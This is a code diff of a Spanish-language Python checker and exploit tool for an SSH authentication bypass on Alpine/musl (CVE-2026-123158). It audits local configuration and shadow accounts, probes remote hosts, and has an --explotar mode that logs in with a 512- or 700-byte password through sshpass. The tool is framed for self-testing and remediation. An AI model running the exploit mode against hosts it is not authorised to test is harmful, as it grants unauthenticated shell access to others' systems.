@@ -1,24 +1,37 @@
 #!/usr/bin/env python3
 """*sshole (CVE-2026-123158) — bypass de autenticación en sshd sobre musl.
 
-Causa raíz (Cycode/Orca, 2026-11-05): musl libc hace que crypt() devuelva
-la cadena "*" cuando falla (desde 2012), y sus SHA-256/512-crypt rechazan
-contraseñas de más de 256 bytes. Las cuentas SIN contraseña (root en
-Alpine 3.16+, usuarios key-only, el usuario "alpine" de las imágenes
-cloud) guardan "*" en shadow. Cuando sshd comprueba la contraseña EL
-SIN PAM (por defecto en openssh-server de Alpine), una contraseña de
-257-1024 bytes hace fallar crypt(), que devuelve "*", que COINCIDE con el
-campo almacenado: login aceptado. glibc (Debian/Ubuntu/Fedora), sshd con
-PAM y Dropbear NO están afectados.
+Causa raíz (Cycode/Orca, 2026-11-05; modelo corregido por la revisión
+Codex gpt-6.1-sol): musl libc hace que crypt() devuelva la cadena "*"
+cuando falla (desde 2012), y sus SHA-256/512-crypt rechazan contraseñas
+de más de 256 bytes. Las cuentas SIN contraseña guardan en shadow
+EXACTAMENTE "*" (no contraseña vacía; "!" o "!!" de cuentas bloqueadas NO
+coinciden). Hace falta ADEMÁS otra cuenta con hash SHA-$5$/$6$: sshd
+elige con su prefijo el algoritmo y salt que aplica a la contraseña
+larga. Cuando sshd comprueba la contraseña SIN PAM (por defecto en
+openssh-server de Alpine), una contraseña de 257-1024 bytes INCLUSIVOS
+hace fallar crypt(), que devuelve "*", que COINCIDE con el campo
+almacenado: login aceptado (auth_password rechaza >1024 por strlen, no
+recorta). keyboard-interactive en OpenSSH/Linux usa PAM: NO es vector —
+solo el método exacto "password". root NO es acceso universal:
+PermitRootLogin prohibit-password protege la cuenta aunque cumpla el
+resto. glibc (Debian/Ubuntu/Fedora), sshd con PAM y Dropbear NO están
+afectados. Alpine <3.16 puede ser vulnerable pero carece de backport.
 
 Comprobación local:  --sistema
 Comprobación remota: --host H [--puerto 22] [--usuario root]
-Explotación:         --host H --explotar [--usuario U]  (login con
-                     contraseña de 512 bytes; acotado a 2 intentos)
+Explotación:         --host H --explotar [--usuario U] [--longitud N]
+                     (contraseña larga vía SSHPASS, nunca por argv;
+                     2 intentos acotados o 1 con --longitud)
+
+Salidas: 0 hallazgo (EXPUESTO/BYPASS_CONFIRMADO), 1 negativo o
+configuración mitigada, 2 uso, 3 inconcluyente (CANDIDATO,
+BYPASS_NO_CONFIRMADO, LOGIN_ACEPTADO_NO_ATRIBUIDO, sonda fallida).
 """
 import argparse
 import os
 import re
+import shutil
 import subprocess
 import socket
 import sys
@@ -31,12 +44,24 @@ FIJOS = {
     "3.19": "9.6_p1-r3", "3.18": "9.3_p2-r4", "3.17": "9.1_p1-r7",
     "3.16": "9.0_p1-r6",
 }
-CONTRA_LARGA = "k" * 512   # dentro de la ventana 257-1024
+# ventana 257-1024 inclusiva; --longitud permite controles de frontera
+LONGITUDES = (256, 257, 512, 700, 1024, 1025)
+# ssh aislada de la config del usuario: sin ProxyCommand, sin multiplexar
+SSH_AISLADA = ["-F", "/dev/null", "-o", "ProxyCommand=none",
+               "-o", "ControlPath=none", "-o", "ControlMaster=no"]
 
 
 def _sh(cmd, timeout=20, env=None):
-    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
-                       env=env, check=False)
+    """Sin shell; fallo de ejecucion = (3, motivo) sin traceback."""
+    try:
+        p = subprocess.run(cmd, capture_output=True, text=True,
+                           timeout=timeout, env=env, check=False)
+    except FileNotFoundError:
+        return 3, f"ejecutable ausente: {cmd[0]}"
+    except subprocess.TimeoutExpired:
+        return 3, f"timeout tras {timeout} s"
+    except OSError as e:
+        return 3, f"error de ejecucion: {e}"
     return p.returncode, (p.stdout or "") + (p.stderr or "")
 
 
@@ -51,8 +76,11 @@ def _rama_alpine():
 def check_sistema(seco):
     if seco:
         print("Plan: leer /etc/alpine-release, musl vs glibc, version de "
-              "openssh contra la tabla de fixes, sshd -T (needs root) y "
-              "cuentas '*' de shadow (needs root); sin tocar el servicio")
+              "openssh contra la tabla de fixes, sshd -T "
+              "(PasswordAuthentication/UsePAM/PermitRootLogin, needs root), "
+              "cuentas '*' Y cuentas SHA-$5$/$6$ de shadow (la cuenta SHA "
+              "es requisito: aporta algoritmo y salt); veredicto solo con "
+              "todos los requisitos verificados; sin tocar el servicio")
         return 0
     rama = _rama_alpine()
     if rama is None:
@@ -61,7 +89,8 @@ def check_sistema(seco):
             print("VEREDICTO: MUSL_NO_ALPINE — libc musl sin "
                   "/etc/alpine-release (OpenWrt/Buildroot/Yocto?): el "
                   "mismo fallo de crypt() aplica; comprueba sshd a mano "
-                  "(PasswordAuthentication sin PAM + cuentas '*')")
+                  "(PasswordAuthentication sin PAM + cuentas '*' + "
+                  "cuenta SHA)")
             return 3
         print("VEREDICTO: NO_AFECTADO — glibc (musl es el requisito del "
               "bug); crypt() de glibc no devuelve '*' al rechazar la "
@@ -76,75 +105,110 @@ def check_sistema(seco):
     pkg = apk.strip() or "(apk info falló; ¿root?)"
     print(f"[i] Alpine {rama} (rama {rama_corta}); ssh -V: {instalado}; "
           f"paquete: {pkg}")
-    fix_txt = fijo or "rama sin rama conocida: actualiza a lo último edge"
+    print("[i] ojo: ssh -V es el CLIENTE y un paquete actualizado no "
+          "demuestra que el demonio en ejecución lo esté — reinicia "
+          "después de actualizar")
+    fix_txt = fijo or "rama sin fix publicado (<3.16 puede ser vulnerable "
+    fix_txt += "pero carece de backport; edge: actualiza a lo último)"
     print(f"[i] fix de la rama: {fix_txt}")
-    expuesto = []
+    if fijo:
+        print(f"ACCIÓN: `apk upgrade -U -a` y `rc-service sshd restart` "
+              f"(el binario nuevo no sustituye al demonio en ejecución); "
+              f"objetivo: openssh >= {fijo}")
+    requisitos = {}
     rc3, cfg = _sh(["sh", "-c", "sshd -T 2>/dev/null | grep -iE "
-                    "'passwordauthentication|usepam'"])
+                    "'passwordauthentication|usepam|permitrootlogin'"])
     if rc3 == 0 and cfg.strip():
         for linea in cfg.strip().splitlines():
             print(f"[i] sshd -T: {linea}")
-        if re.search(r"passwordauthentication yes", cfg, re.I):
-            expuesto.append("PasswordAuthentication sí")
-        if re.search(r"usepam no", cfg, re.I):
-            expuesto.append("UsePAM no (sshd comprueba solo)")
+        requisitos["PasswordAuthentication yes"] = bool(
+            re.search(r"passwordauthentication yes", cfg, re.I))
+        requisitos["UsePAM no"] = bool(re.search(r"usepam no", cfg, re.I))
+        prl = re.search(r"permitrootlogin (\S+)", cfg, re.I)
+        if prl and prl.group(1).lower() == "prohibit-password":
+            print("[i] PermitRootLogin prohibit-password: root queda "
+                  "protegido aunque cumpla el resto — no prometas root")
     else:
-        print("[i] sshd -T sin datos (ejecuta con sudo para ver "
-              "PasswordAuthentication/UsePAM)")
+        print("[i] sshd -T sin datos (ejecuta con sudo)")
+        requisitos["PasswordAuthentication yes"] = None
+        requisitos["UsePAM no"] = None
     rc4, shadow = _sh(["sh", "-c",
-                       "awk -F: '$2==\"*\"{print $1}' /etc/shadow 2>/dev/null"])
-    if rc4 == 0 and shadow.strip():
-        cuentas = shadow.split()
-        print(f"[i] cuentas con campo '*' en shadow (sin contraseña): "
-              f"{', '.join(cuentas[:12])}")
-        expuesto.append(f"{len(cuentas)} cuentas '*'")
-    elif rc4 != 0:
-        print("[i] /etc/shadow sin leer (sudo para ver cuentas '*')")
-    rc5, _ = _sh(["pgrep", "-x", "sshd"])
-    if rc5 != 0:
-        print("[i] sshd no está en ejecución en esta máquina")
+                       "awk -F: '$2==\"*\"{print $1}' /etc/shadow "
+                       "2>/dev/null; echo ---; awk -F: "
+                       "'$2~/^\\$5\\$|^\\$6\\$/{print $1}' /etc/shadow "
+                       "2>/dev/null"])
+    if rc4 == 0 and "---" in shadow:
+        antes, despues = shadow.split("---", 1)
+        estrellas = antes.split()
+        sha = despues.split()
+        print(f"[i] cuentas con campo EXACTO '*' en shadow (sin "
+              f"contraseña; '!' bloqueadas no cuentan): "
+              f"{', '.join(estrellas[:12]) or 'ninguna'}")
+        print(f"[i] cuentas SHA-$5$/$6$ (aporte de algoritmo y salt): "
+              f"{len(sha)}")
+        requisitos["cuenta '*' en shadow"] = bool(estrellas)
+        requisitos["cuenta SHA para selección de algoritmo"] = bool(sha)
+    else:
+        print("[i] /etc/shadow sin leer (sudo para ver cuentas)")
+        requisitos["cuenta '*' en shadow"] = None
+        requisitos["cuenta SHA para selección de algoritmo"] = None
+    requisitos["rama Alpine afectada"] = bool(fijo)
+    cerrados = [k for k, v in requisitos.items() if v is False]
+    if cerrados:
+        print("VEREDICTO: CERRADO — requisito cerrado: " + ", ".join(cerrados)
+              + " (con PAM activo o PasswordAuthentication no, el vector "
+              "no aplica)")
         return 1
-    if fijo and "sin rama" not in str(fijo):
-        print(f"ACCIÓN: actualiza con `apk upgrade -U -a` y "
-              f"`rc-service sshd restart` (el binario nuevo no sustituye "
-              f"al demonio en ejecución); objetivo: openssh >= {fijo}")
-    tiene_pam_no = any("UsePAM" in e for e in expuesto)
-    if tiene_pam_no and len(expuesto) >= 2:
-        print("VEREDICTO: EXPUESTO — " + " + ".join(expuesto) +
-              " sobre musl: prueba la explotación contra ti mismo "
+    if all(v is True for v in requisitos.values()):
+        print("VEREDICTO: EXPUESTO — todos los requisitos verificados "
+              "(musl + PasswordAuthentication + UsePAM no + cuenta '*' + "
+              "cuenta SHA + rama afectada): explota contra ti mismo "
               "(--host 127.0.0.1 --explotar --usuario <cuenta '*'>)")
         return 0
-    if any("PasswordAuthentication" in e for e in expuesto) and \
-            not tiene_pam_no:
-        print("[i] PasswordAuthentication sí pero sin confirmación de "
-              "UsePAM no: con PAM activo el vector está cerrado")
-    print("VEREDICTO: INCONCLUYENTE — faltan datos (sshd -T / shadow "
-          "requieren sudo); con ambos factores confirmados es EXPUESTO")
+    sin_verificar = [k for k, v in requisitos.items() if v is None]
+    print("VEREDICTO: INCONCLUYENTE — requisitos no verificados: "
+          + (", ".join(sin_verificar) or "desconocidos") +
+          " (sshd -T y shadow piden sudo)")
     return 3
 
 
 def _banner(host, puerto):
+    """Identificacion SSH (RFC 4253: saltar lineas preliminares '-'), con
+    presupuesto total de tiempo y bytes; cierra siempre."""
+    fin = time.monotonic() + 10
     try:
-        s = socket.create_connection((host, puerto), timeout=8)
-        s.settimeout(8)
-        data = b""
-        while not data.endswith(b"\n"):
-            chunk = s.recv(256)
-            if not chunk:
-                break
-            data += chunk
-        s.close()
-        return data.decode("utf-8", "replace").strip()
+        s = socket.create_connection((host, puerto), timeout=3)
     except OSError as e:
+        print(f"[i] sin banner: {e}")
         return None
+    datos = b""
+    try:
+        s.settimeout(3)
+        while time.monotonic() < fin and len(datos) < 4096:
+            try:
+                trozo = s.recv(1024)
+            except (TimeoutError, socket.timeout):
+                continue
+            if not trozo:
+                break
+            datos += trozo
+            for linea in datos.split(b"\n"):
+                if linea and not linea.startswith(b"-"):
+                    return linea.decode("utf-8", "replace").strip()
+    except OSError:
+        pass
+    finally:
+        s.close()
+    return None
 
 
 def check_host(host, puerto, usuario, seco):
     if seco:
-        print(f"Plan: banner TCP de {host}:{puerto} + métodos de auth que "
-              f"ofrece para '{usuario}' (NumberOfPasswordPrompts=0, no "
-              "llega a loguear); heurístico — el backport de Alpine no se "
-              "ve en el banner")
+        print(f"Plan: banner TCP de {host}:{puerto} (presupuesto 10 s/4 KiB) "
+              f"+ sonda de métodos de auth con NumberOfPasswordPrompts=0 "
+              f"(usuario {usuario}; método none: en servidores mal "
+              "configurados podría autenticar sin más); heurístico — el "
+              "backport de Alpine no se ve en el banner")
         return 0
     b = _banner(host, puerto)
     if b is None:
@@ -152,76 +216,94 @@ def check_host(host, puerto, usuario, seco):
         return 3
     print(f"[i] banner: {b}")
     es_openssh = re.search(r"OpenSSH_", b)
-    alpine_hint = "alpine" in b.lower() or "linux" in b.lower()
-    rc, out = _sh(["ssh", "-o", "PreferredAuthentications=password",
-                   "-o", "PubkeyAuthentication=no", "-o", "BatchMode=yes",
-                   "-o", "NumberOfPasswordPrompts=0",
-                   "-o", "StrictHostKeyChecking=accept-new",
-                   "-o", "ConnectTimeout=8", "-p", str(puerto),
-                   f"{usuario}@{host}", "true"])
+    if b and "alpine" in b.lower():
+        print("[i] banner con marca Alpine: musl probable")
+    rc, out = _sh(["ssh"] + SSH_AISLADA + [
+        "-o", "PreferredAuthentications=none",
+        "-o", "PubkeyAuthentication=no", "-o", "BatchMode=yes",
+        "-o", "NumberOfPasswordPrompts=0",
+        "-o", "StrictHostKeyChecking=accept-new",
+        "-o", "ConnectTimeout=8", "-p", str(puerto),
+        f"{usuario}@{host}", "true"])
     ofrece = re.search(r"Permission denied \(([^)]*)\)", out)
-    metodos = ofrece.group(1) if ofrece else "(sin lista)"
+    if not ofrece:
+        print("VEREDICTO: INCONCLUYENTE — no se obtuvo la lista de "
+              "autenticación (conexión cortada o ssh ausente): " +
+              (out.strip().splitlines()[-1][:100] if out.strip()
+               else "sin detalle"))
+        return 3
+    metodos = ofrece.group(1)
     print(f"[i] métodos de auth ofrecidos a '{usuario}': {metodos}")
     if not es_openssh:
         print("VEREDICTO: NO_ES_OPENSSH — otro servidor (Dropbear u otro) "
               "no comparte este fallo de musl-crypt")
         return 1
-    if "password" not in metodos and "keyboard" not in metodos:
-        print("VEREDICTO: SIN_AUTH_POR_CONTRASEÑA — PasswordAuthentication "
-              "apagado o cuenta no apta: el vector está cerrado")
+    if "password" not in {m.strip() for m in metodos.split(",")}:
+        print("VEREDICTO: SIN_AUTH_POR_CONTRASEÑA — keyboard-interactive "
+              "usa PAM y NO es vector; sin el método exacto 'password' el "
+              "vector está cerrado para esta cuenta")
         return 1
-    print("VEREDICTO: CANDIDATO — sshd con auth por contraseña a la vista. "
+    print("VEREDICTO: CANDIDATO — sshd con auth por contraseña exacta. "
           "La versión del banner no distingue el backport de Alpine; "
           "confirma con --explotar (login con contraseña de 512 bytes) o "
           "con `sshd -T` en el propio host")
     return 3
 
 
-def explotar(host, puerto, usuario, seco):
+def explotar(host, puerto, usuario, longitud, seco):
+    intentos = [longitud] if longitud else [512, 700]
     if seco:
-        print(f"Plan: 2 intentos de login como '{usuario}' en "
-              f"{host}:{puerto} con contraseña de 512 y 700 bytes "
-              "(ventana 257-1024 del bug), solo password-auth, comando "
+        print(f"Plan: {len(intentos)} intento(s) de login como '{usuario}' "
+              f"en {host}:{puerto} con contraseña de "
+              f"{'/'.join(str(n) for n in intentos)} bytes (ventana "
+              "257-1024), solo método password exacto (keyboard-interactive "
+              "usa PAM), config SSH aislada (-F /dev/null), comando "
               "inofensivo id;hostname. Deja 'Accepted password' en el log "
               "del objetivo si entra: eso ES el IOC buscado")
         return 0
-    entorno = dict(os.environ, SSHPASS=CONTRA_LARGA)
-    for n, contra in ((1, "k" * 512), (2, "k" * 700)):
-        entorno["SSHPASS"] = contra
-        rc, out = _sh(["sshpass", "-e", "ssh",
-                       "-o", "PreferredAuthentications=password",
-                       "-o", "PubkeyAuthentication=no",
-                       "-o", "KbdInteractiveAuthentication=no",
-                       "-o", "NumberOfPasswordPrompts=1",
-                       "-o", "StrictHostKeyChecking=accept-new",
-                       "-o", "ConnectTimeout=10",
-                       "-p", str(puerto), f"{usuario}@{host}",
-                       "id; hostname; cat /etc/alpine-release 2>/dev/null"],
-                      timeout=30, env=entorno)
+    if shutil.which("sshpass") is None:
+        print("Error: falta sshpass (apt install sshpass)")
+        return 2
+    b = _banner(host, puerto) or ""
+    for n in intentos:
+        entorno = dict(os.environ, SSHPASS="k" * n)
+        rc, out = _sh(["sshpass", "-e", "ssh"] + SSH_AISLADA + [
+            "-o", "PreferredAuthentications=password",
+            "-o", "PubkeyAuthentication=no",
+            "-o", "KbdInteractiveAuthentication=no",
+            "-o", "NumberOfPasswordPrompts=1",
+            "-o", "StrictHostKeyChecking=accept-new",
+            "-o", "ConnectTimeout=10",
+            "-p", str(puerto), f"{usuario}@{host}",
+            "id; hostname"], timeout=30, env=entorno)
+        if rc == 2 and "ejecutable ausente" in out:
+            print(f"Error: {out}")
+            return 2
         if rc == 0 and "uid=" in out:
-            print(f"[i] intento {n} (contraseña de {len(contra)} bytes): "
-                  "LOGIN ACEPTADO")
-            for linea in out.strip().splitlines():
-                print(f"    {linea}")
-            print("VEREDICTO: BYPASS_CONFIRMADO — login con contraseña "
-                  "larga en cuenta que no tiene contraseña "
-                  "(CVE-2026-123158). Trata el host como comprometido: "
-                  "rota claves, revisa `Accepted password for` en los "
-                  "logs y actualiza openssh (apk upgrade + restart de "
-                  "sshd).")
-            return 0
-        if "Permission denied" in out or "denied" in out.lower():
-            print(f"[i] intento {n}: denegado")
-        else:
-            print(f"[i] intento {n}: sin login (rc={rc}) — "
-                  + out.strip().splitlines()[-1][:100] if out.strip()
-                  else f"[i] intento {n}: sin login (rc={rc})")
+            print(f"[i] intento ({n} bytes): LOGIN ACEPTADO — "
+                  + out.strip().replace("\n", " | ")[:120])
+            if "alpine" in b.lower():
+                print("VEREDICTO: BYPASS_CONFIRMADO — login con contraseña "
+                      "larga en host Alpine/musl (CVE-2026-123158). Trata "
+                      "el host como comprometido: rota claves, revisa "
+                      "`Accepted password for` en los logs y actualiza "
+                      "openssh (apk upgrade + rc-service sshd restart)")
+                return 0
+            print("VEREDICTO: LOGIN_ACEPTADO_NO_ATRIBUIDO — contraseña "
+                  "larga aceptada, pero rc=0+'uid=' no prueba el CVE por sí "
+                  "solo: corrobora en el servidor que la cuenta tiene "
+                  "shadow EXACTO '*' y que la libc es musl; si es Alpine, "
+                  "es el CVE")
+            return 3
+        print(f"[i] intento ({n} bytes): denegado" if "denied" in out.lower()
+              else f"[i] intento ({n} bytes): sin login (rc={rc}) — "
+              + (out.strip().splitlines()[-1][:100] if out.strip() else ""))
         time.sleep(3)
     print("VEREDICTO: BYPASS_NO_CONFIRMADO — o el host está parcheado, o "
-          "es glibc/PAM, o la cuenta sí tiene contraseña, o "
-          "PasswordAuthentication está apagado; desde fuera no se "
-          "distingue. Prueba con otra cuenta (root en Alpine 3.16+, "
-          "usuario 'alpine', deploy users)")
+          "es glibc/PAM, o la cuenta sí tiene contraseña o está bloqueada "
+          "('!'≠'*'), o PasswordAuthentication está apagado; desde fuera "
+          "no se distingue. Prueba con otra cuenta (root en Alpine 3.16+ "
+          "salvo prohibit-password, usuario 'alpine', deploy users)")
     return 3
 
 
@@ -237,8 +319,17 @@ def main(argv=None):
     s.add_argument("--explotar", action="store_true",
                    help="con --host: intentar el login con contraseña "
                         "larga (2 intentos acotados)")
+    s.add_argument("--longitud", type=int, choices=LONGITUDES,
+                   help="longitud única de prueba (controles de frontera "
+                       "de laboratorio)")
     s.add_argument("--dry-run", action="store_true")
     a = ap.parse_args(argv)
+    if a.puerto < 1 or a.puerto > 65535:
+        print("Error: --puerto debe estar entre 1 y 65535", file=sys.stderr)
+        return 2
+    if a.explotar and not a.host:
+        print("Error: --explotar exige --host", file=sys.stderr)
+        return 2
     if not (a.sistema or a.host):
         print("Error: indica --sistema y/o --host", file=sys.stderr)
         return 2
@@ -248,7 +339,7 @@ def main(argv=None):
     if a.host:
         if a.explotar:
             resultados.append(explotar(a.host, a.puerto, a.usuario,
-                                       a.dry_run))
+                                       a.longitud, a.dry_run))
         else:
             resultados.append(check_host(a.host, a.puerto, a.usuario,
                                          a.dry_run))
